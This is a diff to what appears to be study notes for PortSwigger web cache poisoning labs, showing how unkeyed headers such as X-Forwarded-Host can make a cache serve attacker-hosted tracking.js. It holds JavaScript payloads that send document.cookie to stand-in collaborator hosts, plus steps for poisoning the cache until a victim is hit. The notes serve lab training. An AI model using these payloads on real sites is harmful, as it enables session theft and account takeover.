@@ -603,7 +603,7 @@ body:document.cookie
 
 ### Unkeyed header  
 
->Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** or **X-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.
+>Target use **tracking.js** JavaScript, and is vulnerable to **```X-Forwarded-Host```** or **```X-Host```** header redirecting path, allowing the stealing of cookie by poisoning cache.
 >***Identify*** the web cache headers in response and the tracking.js script in the page source code. Exploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.  
 
 ![Tracking Source code review](images/tracking-code-review.png)  
@@ -615,7 +615,7 @@ X-Host: EXPLOIT.net
 
 ![tracking.js](images/tracking.js.png)  
 
->Hosting on the exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
+>Hosting on the exploit server, injecting the **```X-Forwarded-Host```** header in request, and poison the cache until victim hits poison cache.  
 
 ```
 /resources/js/tracking.js
@@ -629,7 +629,7 @@ X-Host: EXPLOIT.net
 document.location='https://collaboration.net/?cookies='+document.cookie;
 ```  
 
->Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  
+>Keep **Poisoning** the web cache of target by resending request with ```X-Forwarded-Host``` header.  
 
 ![x-cache-hit.png](images/x-cache-hit.png)  
 
@@ -697,6 +697,8 @@ X-Forwarded-Scheme: nothttps
 ```html
 document.location='https://Collaborator.com/?poisoncache='+document.cookie;
 ```  
+
+>Remove the ```cb=123``` cache **buster**, and then poison the cache until the victim is redirected to the exploit server payload tracking.js to steal session cookie.  
 
 [PortSwigger Lab: Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)  
 
